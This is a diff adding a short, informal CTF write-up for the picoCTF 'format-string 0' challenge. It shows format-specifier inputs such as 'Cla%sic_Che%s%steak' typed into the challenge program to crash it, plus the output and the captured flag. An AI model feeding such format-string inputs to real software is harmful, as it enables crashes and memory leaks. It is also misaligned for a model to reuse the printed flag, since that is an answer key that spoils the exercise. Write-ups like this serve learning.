@@ -534,6 +534,20 @@ int main() {
 
 and now you can find the half ouput.
 
+## format-string  0
+honestly i just choose  random and got the flag
+```bash
+Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
+Enter your recommendation: Gr%114d_Cheese
+Gr                                                                                                           4202954_Cheese
+Good job! Patrick is happy! Now can you serve the second customer?
+Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
+Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
+Enter your recommendation: Cla%sic_Che%s%steak
+ClaCla%sic_Che%s%steakic_Che(null)
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
+```
+
 
 ## formant-string 1
 
